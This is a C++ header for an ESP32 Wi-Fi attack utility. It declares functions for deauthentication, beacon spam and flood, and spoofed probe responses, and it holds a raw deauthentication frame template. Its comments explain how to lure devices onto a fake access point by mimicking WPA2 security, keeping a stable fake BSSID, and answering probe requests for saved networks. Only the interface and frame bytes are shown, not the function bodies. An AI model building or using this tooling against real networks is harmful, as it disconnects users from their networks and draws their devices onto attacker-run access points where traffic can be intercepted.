#pragma once

#include <WiFi.h>

typedef uint8_t MacAddr[6];

class WifiAttackUtil
{
public:
  WifiAttackUtil(bool initAP = true);
  ~WifiAttackUtil();
  esp_err_t deauthenticate(const MacAddr bssid, uint8_t channel);
  esp_err_t deauthenticate(const MacAddr ap, const MacAddr bssid, uint8_t channel);
  // wpa2 = true advertises an RSN (WPA2-PSK/CCMP) IE so clients that only
  // remember a *secured* network are enticed; false beacons an open network.
  // srcMac = fake AP BSSID/source. nullptr → randomize a locally-administered
  // MAC per call; pass a stable MAC so the advertised network keeps one BSSID
  // (looks like a real AP, which clients treat more reliably).
  esp_err_t beaconSpam(const char* ssid, uint8_t channel, bool wpa2 = true, const uint8_t* srcMac = nullptr);
  esp_err_t beaconFlood(const uint8_t* bssid, const char* ssid, uint8_t channel);
  // Directed probe response: answers a client's probe request as if `ssid`
  // exists nearby, so a device that has the network saved will try to connect.
  // dst = the probing client's MAC. wpa2 mirrors the beacon RSN mimicry.
  esp_err_t probeResponse(const char* ssid, const MacAddr dst, uint8_t channel, bool wpa2 = true, const uint8_t* srcMac = nullptr);
  esp_err_t setChannel(uint8_t channel);

private:
  int      _currentChannel  = 0;
  uint16_t _sequenceNumber  = 0;

  const uint8_t _deauthDefault[26] = {
    0xc0, 0x00,
    0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff,
    0x02, 0x00
  };

  uint8_t _deauthFrame[26] = {};

  esp_err_t _changeChannel(uint8_t channel) noexcept;
  esp_err_t _sendPacket(const uint8_t* packet, size_t len) noexcept;
};